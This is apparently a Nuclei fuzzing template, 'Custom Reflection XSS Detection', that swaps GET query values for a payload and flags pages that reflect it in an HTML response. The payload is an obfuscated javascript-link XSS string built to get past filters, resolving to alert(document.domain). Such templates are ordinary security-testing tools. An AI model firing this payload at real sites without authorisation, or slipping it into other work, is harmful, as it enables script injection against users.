id: fuzz-reflection-xss-custom

info:
  name: Custom Reflection XSS Detection
  author: netbaan
  severity: low
  description: |
    This template is designed to detect reflection XSS vulnerabilities using a specified link-based payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      reflection:
        - "><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"